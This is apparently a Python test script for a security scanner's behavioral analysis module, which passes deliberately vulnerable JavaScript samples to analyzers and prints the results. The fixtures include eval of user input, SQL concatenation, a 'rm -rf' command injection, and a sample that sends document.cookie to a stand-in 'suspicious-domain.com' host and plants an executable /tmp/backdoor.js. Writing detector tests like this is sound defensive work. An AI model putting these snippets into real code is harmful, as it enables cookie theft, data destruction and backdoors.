#!/usr/bin/env python3
"""
Comprehensive test script for behavioral analysis system.
"""

import asyncio
import sys
import os
from pathlib import Path

# Add the project root to the Python path
project_root = Path(__file__).parent
sys.path.insert(0, str(project_root))

from njordscan.intelligence.behavioral_analyzer import (
    BehavioralAnalyzer, BehavioralAnalysisConfig, BehaviorType, AnomalyType
)
from njordscan.intelligence.intelligence_orchestrator import IntelligenceOrchestrator
from njordscan.ai.ai_orchestrator import AISecurityOrchestrator

async def test_behavioral_analyzer_basic():
    """Test basic behavioral analyzer functionality."""
    print("🔍 Testing Basic Behavioral Analyzer...")
    
    # Create test configuration
    config = BehavioralAnalysisConfig(
        enable_function_analysis=True,
        enable_file_analysis=True,
        enable_temporal_analysis=True,
        anomaly_threshold=0.7
    )
    
    # Initialize analyzer
    analyzer = BehavioralAnalyzer(config)
    
    # Test code with potential behavioral issues
    test_code = """
    // Suspicious code patterns
    function processUserInput(input) {
        // Direct execution without validation
        eval(input);
        
        // File system access
        fs.readFileSync(input, 'utf8');
        
        // Network request
        fetch(input);
        
        // Database query
        db.query("SELECT * FROM users WHERE id = " + input);
    }
    
    // Anomalous function call pattern
    function suspiciousPattern() {
        setTimeout(() => {
            setInterval(() => {
                processUserInput(document.cookie);
            }, 1000);
        }, 5000);
    }
    """
    
    try:
        # Analyze the code
        results = await analyzer.analyze_code_behavior("test.js", test_code)
        
        print(f"  ✅ Analysis completed")
        print(f"  ✅ Events detected: {len(results.get('events', []))}")
        print(f"  ✅ Sequences created: {len(results.get('sequences', []))}")
        print(f"  ✅ Anomalies found: {len(results.get('anomalies', []))}")
        print(f"  ✅ Signature matches: {len(results.get('signature_matches', []))}")
        
        # Check for specific behavioral patterns
        events = results.get('events', [])
        if events:
            print(f"  ✅ Behavioral events detected:")
            for event in events[:3]:  # Show first 3 events
                print(f"    - {event.get('event_type', 'unknown')}: {event.get('description', 'N/A')}")
        
        # Check anomalies
        anomalies = results.get('anomalies', [])
        if anomalies:
            print(f"  ✅ Anomalies detected:")
            for anomaly in anomalies[:3]:  # Show first 3 anomalies
                print(f"    - {anomaly.get('anomaly_type', 'unknown')}: {anomaly.get('description', 'N/A')}")
        
        return True
        
    except Exception as e:
        print(f"  ❌ Behavioral analysis failed: {e}")
        return False

async def test_behavioral_analyzer_signatures():
    """Test behavioral signature matching."""
    print("\n🎯 Testing Behavioral Signature Matching...")
    
    config = BehavioralAnalysisConfig(
        enable_pattern_anomalies=True,
        enable_sequence_anomalies=True
    )
    
    analyzer = BehavioralAnalyzer(config)
    
    # Test code with known attack patterns
    attack_patterns = [
        # XSS pattern
        "document.innerHTML = userInput;",
        
        # SQL injection pattern
        "SELECT * FROM users WHERE id = " + "userId",
        
        # Command injection pattern
        "exec('rm -rf ' + userPath);",
        
        # Path traversal pattern
        "fs.readFileSync('../' + filename);"
    ]
    
    try:
        total_events = 0
        total_anomalies = 0
        
        for i, pattern in enumerate(attack_patterns):
            test_code = f"function test{i}() {{ {pattern} }}"
            
            results = await analyzer.analyze_code_behavior(f"test_{i}.js", test_code)
            
            events = results.get('events', [])
            anomalies = results.get('anomalies', [])
            
            total_events += len(events)
            total_anomalies += len(anomalies)
            
            print(f"  ✅ Pattern {i+1}: {len(events)} events, {len(anomalies)} anomalies")
        
        print(f"  ✅ Total: {total_events} events, {total_anomalies} anomalies detected")
        return True
        
    except Exception as e:
        print(f"  ❌ Signature matching failed: {e}")
        return False

async def test_behavioral_analyzer_integration():
    """Test behavioral analyzer integration with vulnerability types."""
    print("\n🔗 Testing Behavioral Analyzer Integration...")
    
    from njordscan.vulnerability import Vulnerability, Severity, Confidence
    
    # Create test vulnerability
    test_vuln = Vulnerability(
        id="test_behavioral_integration",
        title="Command Injection Vulnerability",
        description="Potential command injection in user input",
        severity=Severity.CRITICAL,
        confidence=Confidence.HIGH,
        vuln_type="command_injection",
        file_path="server.js",
        line_number=15,
        code_snippet="exec(userCommand);",
        fix="Use safe command execution methods and validate input",
        reference="https://owasp.org/www-community/attacks/Command_Injection"
    )
    
    # Initialize analyzer
    analyzer = BehavioralAnalyzer()
    
    try:
        # Test vulnerability enhancement
        enhanced_vuln = analyzer.enhance_vulnerability_with_behavioral_context(test_vuln)
        
        print(f"  ✅ Vulnerability enhanced: {enhanced_vuln.title}")
        print(f"  ✅ Type: {enhanced_vuln.vuln_type}")
        
        # Check if metadata was enhanced
        if enhanced_vuln.metadata and 'behavioral_analysis' in enhanced_vuln.metadata:
            print(f"  ✅ Behavioral analysis metadata added")
            print(f"  ✅ CWE codes: {enhanced_vuln.metadata.get('cwe_codes', [])}")
            print(f"  ✅ OWASP category: {enhanced_vuln.metadata.get('owasp_category', 'N/A')}")
            
            behavioral_meta = enhanced_vuln.metadata['behavioral_analysis']
            print(f"  ✅ Analyzed: {behavioral_meta.get('analyzed', False)}")
            print(f"  ✅ Risk indicators: {behavioral_meta.get('risk_indicators', [])}")
        
        return True
        
    except Exception as e:
        print(f"  ❌ Integration test failed: {e}")
        return False

async def test_intelligence_orchestrator_behavioral():
    """Test behavioral analysis through intelligence orchestrator."""
    print("\n🧠 Testing Intelligence Orchestrator Behavioral Analysis...")
    
    try:
        # Initialize orchestrator
        orchestrator = IntelligenceOrchestrator()
        await orchestrator.initialize()
        
        # Test code with behavioral issues
        test_code = """
        // Complex behavioral pattern
        function handleRequest(req, res) {
            const userInput = req.body.data;
            
            // Multiple suspicious operations
            eval(userInput);
            fs.writeFileSync('/tmp/' + userInput, 'data');
            fetch('http://external-site.com/' + userInput);
            
            // Timing-based behavior
            setTimeout(() => {
                process.exit(0);
            }, 10000);
        }
        """
        
        # Perform intelligence analysis
        report = await orchestrator.analyze_security_intelligence("api.js", test_code)
        
        print(f"  ✅ Intelligence analysis completed")
        print(f"  ✅ Total findings: {report.total_findings}")
        print(f"  ✅ Threat level: {report.threat_level.value}")
        print(f"  ✅ Overall risk score: {report.overall_risk_score:.2f}")
        
        # Check behavioral analysis results
        if report.behavioral_analysis:
            behavioral = report.behavioral_analysis
            print(f"  ✅ Behavioral events: {behavioral.get('events_detected', 0)}")
            print(f"  ✅ Behavioral sequences: {behavioral.get('sequences_created', 0)}")
            print(f"  ✅ Behavioral anomalies: {behavioral.get('anomalies_found', 0)}")
            print(f"  ✅ Behavioral findings: {len(behavioral.get('findings', []))}")
        
        # Check for behavioral findings
        behavioral_findings = [
            f for f in report.findings 
            if f.finding_type == 'behavioral_anomaly'
        ]
        
        if behavioral_findings:
            print(f"  ✅ Behavioral findings detected:")
            for finding in behavioral_findings[:3]:
                print(f"    - {finding.title}: {finding.severity.value}")
        
        await orchestrator.shutdown()
        return True
        
    except Exception as e:
        print(f"  ❌ Intelligence orchestrator test failed: {e}")
        return False

async def test_ai_orchestrator_behavioral():
    """Test behavioral analysis through AI orchestrator."""
    print("\n🤖 Testing AI Orchestrator Behavioral Analysis...")
    
    try:
        # Initialize AI orchestrator
        ai_orchestrator = AISecurityOrchestrator()
        
        # Test data with behavioral patterns
        test_data = {
            'code_content': """
            // AI-detected behavioral patterns
            function suspiciousBehavior() {
                // Unusual timing patterns
                setInterval(() => {
                    // Data exfiltration pattern
                    fetch('http://suspicious-domain.com/steal?data=' + document.cookie);
                }, 30000);
                
                // File system manipulation
                fs.writeFileSync('/tmp/backdoor.js', maliciousCode);
                
                // Process manipulation
                child_process.exec('chmod +x /tmp/backdoor.js');
            }
            """,
            'api_calls': ['fetch', 'fs.writeFileSync', 'child_process.exec'],
            'execution_times': [0.1, 0.2, 0.15, 0.3, 0.1],
            'memory_usage': 1024,
            'cpu_usage': 0.8
        }
        
        # Perform AI analysis
        result = await ai_orchestrator.perform_comprehensive_analysis("malicious.js", test_data)
        
        print(f"  ✅ AI analysis completed")
        print(f"  ✅ Analysis ID: {result.analysis_id}")
        print(f"  ✅ Overall security score: {result.overall_security_score:.1f}/100")
        print(f"  ✅ Risk level: {result.risk_level}")
        print(f"  ✅ Confidence: {result.confidence:.2f}")
        print(f"  ✅ Anomalies detected: {len(result.anomalies)}")
        
        # Check anomaly details
        if result.anomalies:
            print(f"  ✅ Anomaly details:")
            for anomaly in result.anomalies[:3]:
                print(f"    - {anomaly.anomaly_type.value}: {anomaly.description}")
                print(f"      Severity: {anomaly.severity.value}, Confidence: {anomaly.confidence:.2f}")
        
        # Check key findings
        if result.key_findings:
            print(f"  ✅ Key findings:")
            for finding in result.key_findings[:3]:
                print(f"    - {finding}")
        
        return True
        
    except Exception as e:
        print(f"  ❌ AI orchestrator test failed: {e}")
        return False

async def test_behavioral_analyzer_statistics():
    """Test behavioral analyzer statistics and performance."""
    print("\n📊 Testing Behavioral Analyzer Statistics...")
    
    try:
        analyzer = BehavioralAnalyzer()
        
        # Get initial statistics
        stats = analyzer.get_statistics()
        
        print(f"  ✅ Initial statistics:")
        print(f"    - Events processed: {stats.get('events_processed', 0)}")
        print(f"    - Sequences created: {stats.get('sequences_created', 0)}")
        print(f"    - Anomalies detected: {stats.get('anomalies_detected', 0)}")
        print(f"    - Signatures matched: {stats.get('signatures_matched', 0)}")
        print(f"    - Uptime: {stats.get('uptime', 0):.2f}s")
        
        # Perform some analysis to generate statistics
        test_codes = [
            "eval(userInput);",
            "fs.readFileSync('../' + filename);",
            "fetch('http://external.com/' + data);"
        ]
        
        for i, code in enumerate(test_codes):
            await analyzer.analyze_code_behavior(f"test_{i}.js", code)
        
        # Get updated statistics
        updated_stats = analyzer.get_statistics()
        
        print(f"  ✅ Updated statistics:")
        print(f"    - Events processed: {updated_stats.get('events_processed', 0)}")
        print(f"    - Sequences created: {updated_stats.get('sequences_created', 0)}")
        print(f"    - Anomalies detected: {updated_stats.get('anomalies_detected', 0)}")
        print(f"    - Average analysis time: {updated_stats.get('average_analysis_time', 0):.3f}s")
        
        return True
        
    except Exception as e:
        print(f"  ❌ Statistics test failed: {e}")
        return False

async def main():
    """Run all behavioral analysis tests."""
    print("🛡️ NjordScan Behavioral Analysis Testing")
    print("=" * 60)
    
    test_results = []
    
    try:
        # Test 1: Basic behavioral analyzer
        result1 = await test_behavioral_analyzer_basic()
        test_results.append(("Basic Behavioral Analyzer", result1))
        
        # Test 2: Signature matching
        result2 = await test_behavioral_analyzer_signatures()
        test_results.append(("Signature Matching", result2))
        
        # Test 3: Integration with vulnerability types
        result3 = await test_behavioral_analyzer_integration()
        test_results.append(("Vulnerability Type Integration", result3))
        
        # Test 4: Intelligence orchestrator
        result4 = await test_intelligence_orchestrator_behavioral()
        test_results.append(("Intelligence Orchestrator", result4))
        
        # Test 5: AI orchestrator
        result5 = await test_ai_orchestrator_behavioral()
        test_results.append(("AI Orchestrator", result5))
        
        # Test 6: Statistics and performance
        result6 = await test_behavioral_analyzer_statistics()
        test_results.append(("Statistics & Performance", result6))
        
        # Summary
        print("\n" + "=" * 60)
        print("📋 Test Results Summary:")
        
        passed = 0
        total = len(test_results)
        
        for test_name, result in test_results:
            status = "✅ PASSED" if result else "❌ FAILED"
            print(f"  {status} {test_name}")
            if result:
                passed += 1
        
        print(f"\n🎯 Overall Result: {passed}/{total} tests passed")
        
        if passed == total:
            print("🎉 All behavioral analysis tests passed!")
            print("✅ Behavioral analysis system is working correctly")
        else:
            print("⚠️ Some behavioral analysis tests failed")
            print("🔧 Review the failed tests above")
        
        return passed == total
        
    except Exception as e:
        print(f"\n❌ Behavioral analysis testing failed: {e}")
        import traceback
        traceback.print_exc()
        return False

if __name__ == "__main__":
    asyncio.run(main())
